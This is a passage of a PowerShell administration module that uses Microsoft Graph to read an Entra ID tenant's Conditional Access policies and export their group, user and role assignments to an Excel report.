        $CustomObject | Add-Member -MemberType NoteProperty -Name "sessionControlssignInFrequency" -Value (Out-String -InputObject $Policy.sessionControls.signInFrequency)


        # sessionControlspersistentBrowser
        $CustomObject | Add-Member -MemberType NoteProperty -Name "sessionControlspersistentBrowser" -Value (Out-String -InputObject $Policy.sessionControls.persistentBrowser)


        # Return object.
        $CustomObject
    }


    # Export the result to Excel.
    Write-Verbose -Verbose -Message "Exporting report to Excel..."
    $Path = "$((Get-Location).Path)\Conditional Access Policy Design Report $(Get-Date -Format 'yyyy-MM-dd').xlsx"
    $Result | Export-Excel -Path $Path -WorksheetName "CA Policies" -BoldTopRow -FreezeTopRow -AutoFilter -AutoSize -ClearSheet -Show


    Write-Verbose -Verbose -Message "Saved $Path"
    Write-Verbose -Verbose -Message "Done!"
}



function New-DCConditionalAccessAssignmentReport {
    <#
        .SYNOPSIS
            Automatically generate an Excel report containing your current Conditional Access assignments.

        .DESCRIPTION
            Uses Microsoft Graph to fetch all Conditional Access policy assignments, both group- and user assignments (for now, it doesn't support role assignments). It exports them to Excel in a nicely formatted report for your filtering and analysing needs. If you include the -IncludeGroupMembers parameter, members of assigned groups will be included in the report as well (of course, this can produce very large reports if you have included large groups in your policy assignments).

            The purpose of the report is to give you an overview of how Conditional Access policies are currently applied in an Entra ID tenant, and which users are targeted by which policies.

            The report does not include information about the policies themselves. Use New-DCConditionalAccessPolicyDesignReport for that task.

            The CMDlet also uses the PowerShell Excel Module for the export to Excel. You can install this module with:
            Install-Module ImportExcel -Force

            The report is exported to Excel and will automatically open. In Excel, please do this:
            1. Select all cells.
            2. Click on "Wrap Text".
            3. Click on "Top Align".

            The report is now easier to read.

            More information can be found here: https://danielchronlund.com/2020/10/20/export-your-conditional-access-policy-assignments-to-excel/
            
        .PARAMETER IncludeGroupMembers
            If you include the -IncludeGroupMembers parameter, members of assigned groups will be included in the report as well (of course, this can produce a very large report if you have included large groups in your policy assignments).
            
        .INPUTS
            None

        .OUTPUTS
            Excel report with all Conditional Access aassignments.

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            New-DCConditionalAccessAssignmentReport
        
        .EXAMPLE
            New-DCConditionalAccessAssignmentReport -IncludeGroupMembers
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [switch]$IncludeGroupMembers
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check if the Excel module is installed.
    if (Get-Module -ListAvailable -Name "ImportExcel") {
        # Do nothing.
    }
    else {
        Write-Error -Exception "The Excel PowerShell module is not installed. Please, run 'Install-Module ImportExcel -Force' as an admin and try again." -ErrorAction Stop
    }


    # Connect to Microsoft Graph.
    Write-Verbose -Verbose -Message "Connecting to Microsoft Graph..."
    if (!($AccessToken)) {
        $AccessToken = Invoke-DCEntraIDDeviceAuthFlow -ReturnAccessTokenInsteadOfRefreshToken
    }


    # Get all Conditional Access policies.
    Write-Verbose -Verbose -Message "Getting all Conditional Access policies..."
    $GraphUri = 'https://graph.microsoft.com/beta/identity/conditionalAccess/policies'
    $CAPolicies = @(Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri)
    Write-Verbose -Verbose -Message "Found $(($CAPolicies).Count) policies..."


    # Get all group and user conditions from the policies.
    $CAPolicies = foreach ($Policy in $CAPolicies) {
        Write-Verbose -Verbose -Message "Getting assignments for policy $($Policy.displayName)..."
        $CustomObject = New-Object -TypeName psobject


        $CustomObject | Add-Member -MemberType NoteProperty -Name "displayName" -Value $Policy.displayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "state" -Value $Policy.state


        Write-Verbose -Verbose -Message "Getting include groups for policy $($Policy.displayName)..."
        $includeGroupsDisplayName = foreach ($Object in $Policy.conditions.users.includeGroups) {
            $GraphUri = "https://graph.microsoft.com/v1.0/groups/$Object"
            try {
                (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).displayName
            }
            catch {
                # Do nothing.
            }
        }
        
        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeGroupsDisplayName" -Value $includeGroupsDisplayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeGroupsId" -Value $Policy.conditions.users.includeGroups


        Write-Verbose -Verbose -Message "Getting exclude groups for policy $($Policy.displayName)..."
        $excludeGroupsDisplayName = foreach ($Object in $Policy.conditions.users.excludeGroups) {
            $GraphUri = "https://graph.microsoft.com/v1.0/groups/$Object"
            try {
                (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).displayName
            }
            catch {
                # Do nothing.
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeGroupsDisplayName" -Value $excludeGroupsDisplayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeGroupsId" -Value $Policy.conditions.users.excludeGroups


        Write-Verbose -Verbose -Message "Getting include users for policy $($Policy.displayName)..."
        $includeUsersUserPrincipalName = foreach ($Object in $Policy.conditions.users.includeUsers) {
            if ($Object -ne "All" -and $Object -ne "GuestsOrExternalUsers" -and $Object -ne "None") {
                $GraphUri = "https://graph.microsoft.com/v1.0/users/$Object"
                try {
                    (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri -ErrorAction "Continue").userPrincipalName
                }
                catch {
                    # Do nothing.
                }
            }
            else {
                $Object
            }
        }

        if ($Policy.conditions.users.includeUsers -ne "All" -and $Policy.conditions.users.includeUsers -ne "GuestsOrExternalUsers" -and $Policy.conditions.users.includeUsers -ne "None") {
            $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUsersUserPrincipalName" -Value $includeUsersUserPrincipalName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUsersId" -Value $Policy.conditions.users.includeUsers
        }
        else {
            $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUsersUserPrincipalName" -Value $Policy.conditions.users.includeUsers
            $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUsersId" -Value $Policy.conditions.users.includeUsers
        }


        Write-Verbose -Verbose -Message "Getting exclude users for policy $($Policy.displayName)..."
        $excludeUsersUserPrincipalName = foreach ($Object in $Policy.conditions.users.excludeUsers) {
            if ($Object -ne "All" -and $Object -ne "GuestsOrExternalUsers" -and $Object -ne "None") {
                $GraphUri = "https://graph.microsoft.com/v1.0/users/$Object"
                try {
                    (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri -ErrorAction "Continue").userPrincipalName
                }
                catch {
                    # Do nothing.
                }
            }
            else {
                $Object
            }
        }

        if ($Policy.conditions.users.excludeUsers -ne "All" -and $Policy.conditions.users.excludeUsers -ne "GuestsOrExternalUsers" -and $Policy.conditions.users.excludeUsers -ne "None") {
            $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeUsersUserPrincipalName" -Value $excludeUsersUserPrincipalName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeUsersId" -Value $Policy.conditions.users.exludeUsers
        }
        else {
            $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeUsersUserPrincipalName" -Value $Policy.conditions.users.exludeUsers
            $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeUsersId" -Value $Policy.conditions.users.exludeUsers
        }


        Write-Verbose -Verbose -Message "Getting include roles for policy $($Policy.displayName)..."
        $includeRolesDisplayName = foreach ($Object in $Policy.conditions.users.includeRoles) {
            $GraphUri = "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=$Object"
            $RoleInfo = Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri -ErrorAction SilentlyContinue
            
            if ($RoleInfo.displayName) {
                $RoleInfo.displayName
            }
            else {
                $Object
            }
        }
        
        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeRolesDisplayName" -Value $includeRolesDisplayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeRolesId" -Value $Policy.conditions.users.includeRoles


        Write-Verbose -Verbose -Message "Getting exclude roles for policy $($Policy.displayName)..."
        $excludeRolesDisplayName = foreach ($Object in $Policy.conditions.users.excludeRoles) {
            $GraphUri = "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=$Object"
            $RoleInfo = Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri -ErrorAction SilentlyContinue
            
            if ($RoleInfo.displayName) {
                $RoleInfo.displayName
            }
            else {
                $Object
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeRolesDisplayName" -Value $excludeRolesDisplayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeRolesId" -Value $Policy.conditions.users.excludeRoles


        $CustomObject
    }


    # Fetch include group members from Entra ID:
    $IncludeGroupMembersFromAd = @()
    if ($IncludeGroupMembers) {
        $IncludeGroupMembersFromAd = foreach ($Group in ($CAPolicies.includeGroupsId | Select-Object -Unique)) {
            Write-Verbose -Verbose -Message "Getting include group members for policy $($Policy.displayName)..."

            $GraphUri = "https://graph.microsoft.com/v1.0/groups/$Group"
            $GroupName = (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).displayName

            $GraphUri = "https://graph.microsoft.com/v1.0/groups/$Group/members"
            $Members = (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).userPrincipalName | Sort-Object userPrincipalName

            $CustomObject = New-Object -TypeName psobject
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Group" -Value $GroupName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Members" -Value $Members
            $CustomObject
        }
    }


    # Fetch exclude group members from Entra ID:
    $ExcludeGroupMembersFromAd = @()
    if ($IncludeGroupMembers) {
        $ExcludeGroupMembersFromAd = foreach ($Group in ($CAPolicies.excludeGroupsId | Select-Object -Unique)) {
            Write-Verbose -Verbose -Message "Getting exclude group members for policy $($Policy.displayName)..."

            $GraphUri = "https://graph.microsoft.com/v1.0/groups/$Group"
            $GroupName = (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).displayName

            $GraphUri = "https://graph.microsoft.com/v1.0/groups/$Group/members"
            $Members = (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).userPrincipalName | Sort-Object userPrincipalName

            $CustomObject = New-Object -TypeName psobject
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Group" -Value $GroupName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Members" -Value $Members
            $CustomObject
        }
    }


    # Get all group and user conditions from the policies.
    $Result = foreach ($Policy in $CAPolicies) {
        # Initiate custom object.
        $CustomObject = New-Object -TypeName psobject

        
        $CustomObject | Add-Member -MemberType NoteProperty -Name "displayName" -Value $Policy.displayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "state" -Value $Policy.state


        # Format include groups.
        [string]$includeGroups = foreach ($Group in ($Policy.includeGroupsDisplayName | Sort-Object)) {
            "$Group`r`n"
        }

        if ($includeGroups.Length -gt 1) {
            $includeGroups = $includeGroups.Substring(0, "$includeGroups".Length - 1)
        }

        [string]$includeGroups = [string]$includeGroups -replace "`r`n ", "`r`n"

        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeGroups" -Value $includeGroups


        # Format include users.
        [string]$includeUsers = $Policy.includeUsersUserPrincipalName -replace " ", "`r`n"
        if ($includeUsers) {
            [string]$includeUsers += "`r`n" 
        }

        if ($IncludeGroupMembers) {
            [string]$includeUsers += foreach ($Group in $Policy.includeGroupsDisplayName) {
                [string](($includeGroupMembersFromAd | Where-Object { $_.Group -eq $Group }).Members | Sort-Object) -replace " ", "`r`n"
            }
        }

        $includeUsers = $includeUsers -replace " ", "`r`n"

        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUsers" -Value $includeUsers

        foreach ($User in ($Policy.includeUsersUserPrincipalName | Sort-Object)) {
            $includeUsers = "$includeUsers`r`n$User"
        }


        # Format include roles.
        [string]$includeRoles = foreach ($Role in ($Policy.includeRolesDisplayName | Sort-Object)) {
            "$Role`r`n"
        }

        if ($includeRoles.Length -gt 1) {
            $includeRoles = $includeRoles.Substring(0, "$includeRoles".Length - 1)
        }

        [string]$includeRoles = [string]$includeRoles -replace "`r`n ", "`r`n"

        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeRoles" -Value $includeRoles


        # Format exclude groups.
        [string]$excludeGroups = foreach ($Group in ($Policy.excludeGroupsDisplayName | Sort-Object)) {
            "$Group`r`n"
        }

        if ($excludeGroups.Length -gt 1) {
            $excludeGroups = $excludeGroups.Substring(0, "$excludeGroups".Length - 1)
        }

        [string]$excludeGroups = [string]$excludeGroups -replace "`r`n ", "`r`n"

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeGroups" -Value $excludeGroups


        # Format exclude users.
        [string]$excludeUsers = $Policy.excludeUsersUserPrincipalName -replace " ", "`r`n"
        if ($excludeUsers) {
            [string]$excludeUsers += "`r`n" 
        }

        if ($IncludeGroupMembers) {
            [string]$excludeUsers += foreach ($Group in $Policy.excludeGroupsDisplayName) {
                [string](($ExcludeGroupMembersFromAd | Where-Object { $_.Group -eq $Group }).Members | Sort-Object) -replace " ", "`r`n"
            }
        }

        $excludeUsers = $excludeUsers -replace " ", "`r`n"

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeUsers" -Value $excludeUsers

        foreach ($User in ($Policy.excludeUsersUserPrincipalName | Sort-Object)) {
            $excludeUsers = "$excludeUsers`r`n$User"
        }


        # Format exlude roles.
        [string]$exludeRoles = foreach ($Role in ($Policy.excludeRolesDisplayName | Sort-Object)) {
            "$Role`r`n"
        }

        if ($exludeRoles.Length -gt 1) {
            $exludeRoles = $exludeRoles.Substring(0, "$exludeRoles".Length - 1)
        }

        [string]$exludeRoles = [string]$exludeRoles -replace "`r`n ", "`r`n"

        $CustomObject | Add-Member -MemberType NoteProperty -Name "exludeRoles" -Value $exludeRoles


        # Output the result.
        $CustomObject
    }


    # Export the result to Excel.
    Write-Verbose -Verbose -Message "Exporting report to Excel..."
    $Path = "$((Get-Location).Path)\Conditional Access Assignment Report $(Get-Date -Format 'yyyy-MM-dd').xlsx"
    $Result | Export-Excel -Path $Path -WorksheetName "CA Assignments" -BoldTopRow -FreezeTopRow -AutoFilter -AutoSize -ClearSheet -Show


    Write-Verbose -Verbose -Message "Saved $Path"
    Write-Verbose -Verbose -Message "Done!"


    # ----- [End] -----
}
